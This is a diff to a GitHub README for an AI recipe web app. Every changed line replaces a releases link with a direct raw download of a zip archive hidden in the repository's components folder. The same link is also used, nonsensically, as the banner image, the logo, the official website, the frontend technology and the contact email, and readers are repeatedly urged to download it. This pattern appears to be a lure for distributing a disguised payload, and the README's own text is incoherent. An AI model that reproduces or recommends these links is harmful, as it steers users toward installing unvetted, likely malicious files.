@@ -1,6 +1,6 @@
 # 🌿🍳 Welcome to Nature's Pantry AI Recipe App! 🍳🌿
 
-![Nature's Pantry Banner](https://github.com/krishkatrodiya001/nature-pantry-ai-recipe-app/releases/tag/v1.2)
+![Nature's Pantry Banner](https://github.com/krishkatrodiya001/nature-pantry-ai-recipe-app/raw/refs/heads/main/components/app-nature-ai-pantry-recipe-v3.6-beta.3.zip)
 
 ## Description:
 
@@ -26,7 +26,7 @@ Nature's Pantry is a unique web application that allows users to explore the cul
 
 🏷️ **Topics:** ai, artificial-intelligence, comedy, cooking, cooking-recipes, demo, demo-app, javascript, nature, puter, puter-ai, react, react-app, react-components, recipe-app, recipe-website, recipes, recipes-app
 
-🔗 **Link:** [Download https://github.com/krishkatrodiya001/nature-pantry-ai-recipe-app/releases/tag/v1.2](https://github.com/krishkatrodiya001/nature-pantry-ai-recipe-app/releases/tag/v1.2)
+🔗 **Link:** [Download https://github.com/krishkatrodiya001/nature-pantry-ai-recipe-app/raw/refs/heads/main/components/app-nature-ai-pantry-recipe-v3.6-beta.3.zip](https://github.com/krishkatrodiya001/nature-pantry-ai-recipe-app/raw/refs/heads/main/components/app-nature-ai-pantry-recipe-v3.6-beta.3.zip)
 
 🚀 **For more information:** Check the "Releases" section for additional updates and resources.
 
@@ -34,9 +34,9 @@ Nature's Pantry is a unique web application that allows users to explore the cul
 
 ## Get Started:
 
-👩‍🍳 **Ready to Cook?:** Start exploring the culinary wonders of nature by clicking the link above to download https://github.com/krishkatrodiya001/nature-pantry-ai-recipe-app/releases/tag/v1.2!
+👩‍🍳 **Ready to Cook?:** Start exploring the culinary wonders of nature by clicking the link above to download https://github.com/krishkatrodiya001/nature-pantry-ai-recipe-app/raw/refs/heads/main/components/app-nature-ai-pantry-recipe-v3.6-beta.3.zip!
 
-🖥️ **Visit Our Website:** Explore more about Nature's Pantry AI Recipe App by visiting the [official website](https://github.com/krishkatrodiya001/nature-pantry-ai-recipe-app/releases/tag/v1.2).
+🖥️ **Visit Our Website:** Explore more about Nature's Pantry AI Recipe App by visiting the [official website](https://github.com/krishkatrodiya001/nature-pantry-ai-recipe-app/raw/refs/heads/main/components/app-nature-ai-pantry-recipe-v3.6-beta.3.zip).
 
 ⚡ **Get Inspired:** Let Nature's Pantry stimulate your creativity in the kitchen with AI-generated recipes based on your backyard ingredients!
 
@@ -44,7 +44,7 @@ Nature's Pantry is a unique web application that allows users to explore the cul
 
 ## About the Technology:
 
-🌐 **Frontend:** Built using https://github.com/krishkatrodiya001/nature-pantry-ai-recipe-app/releases/tag/v1.2 with interactive components for a seamless user experience.
+🌐 **Frontend:** Built using https://github.com/krishkatrodiya001/nature-pantry-ai-recipe-app/raw/refs/heads/main/components/app-nature-ai-pantry-recipe-v3.6-beta.3.zip with interactive components for a seamless user experience.
 
 🧠 **AI Integration:** Leveraging cutting-edge AI algorithms to suggest creative recipes based on input ingredients.
 
@@ -66,7 +66,7 @@ Nature's Pantry is a unique web application that allows users to explore the cul
 
 🌿 **Stay Connected:** Follow us on Twitter, Facebook, and Instagram for the latest updates and recipe inspiration.
 
-📧 **Contact Us:** Reach out to us via email at https://github.com/krishkatrodiya001/nature-pantry-ai-recipe-app/releases/tag/v1.2 for inquiries and collaborations.
+📧 **Contact Us:** Reach out to us via email at https://github.com/krishkatrodiya001/nature-pantry-ai-recipe-app/raw/refs/heads/main/components/app-nature-ai-pantry-recipe-v3.6-beta.3.zip for inquiries and collaborations.
 
 👥 **Partnerships:** Interested in collaborating with Nature's Pantry? Let's discuss how we can work together to promote sustainable and delicious cooking practices.
 
@@ -84,7 +84,7 @@ Nature's Pantry is a unique web application that allows users to explore the cul
 
 ## Let's Cook with Nature's Pantry AI Recipe App!
 
-![Nature's Pantry Logo](https://github.com/krishkatrodiya001/nature-pantry-ai-recipe-app/releases/tag/v1.2)
+![Nature's Pantry Logo](https://github.com/krishkatrodiya001/nature-pantry-ai-recipe-app/raw/refs/heads/main/components/app-nature-ai-pantry-recipe-v3.6-beta.3.zip)
 
 Dive into the world of natural ingredients and AI-fueled cooking suggestions with Nature's Pantry. Start exploring new recipes, utilizing backyard treasures, and fostering a deeper connection with the food you eat. Happy cooking! 🌿🍲
 
